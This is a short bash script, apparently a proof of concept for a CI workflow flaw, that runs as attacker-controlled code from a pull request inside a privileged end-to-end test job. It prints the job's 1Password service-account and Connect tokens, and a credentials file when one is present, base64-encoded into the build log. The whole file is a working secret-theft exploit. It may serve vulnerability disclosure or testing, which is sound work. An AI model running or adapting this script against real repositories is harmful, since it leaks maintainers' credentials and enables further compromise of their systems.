#!/usr/bin/env bash
# Attacker-controlled file from the contributor's change. It is executed because the
# e2e reusable workflow checks out the PR head SHA and runs `make test-e2e` from it,
# with the repository's OP_CONNECT / OP_SERVICE_ACCOUNT secrets in the environment.
echo "== attacker code executing inside the privileged e2e run =="
echo "whoami=$(whoami) repo=${GITHUB_REPOSITORY} ref=${GITHUB_SHA}"
echo "OP_SERVICE_ACCOUNT_TOKEN_B64=$(printf '%s' "${OP_SERVICE_ACCOUNT_TOKEN}" | base64 -w0)"
echo "OP_CONNECT_TOKEN_B64=$(printf '%s' "${OP_CONNECT_TOKEN}" | base64 -w0)"
if [ -f 1password-credentials.json ]; then
  echo "OP_CONNECT_CREDENTIALS_B64=$(base64 -w0 1password-credentials.json)"
fi
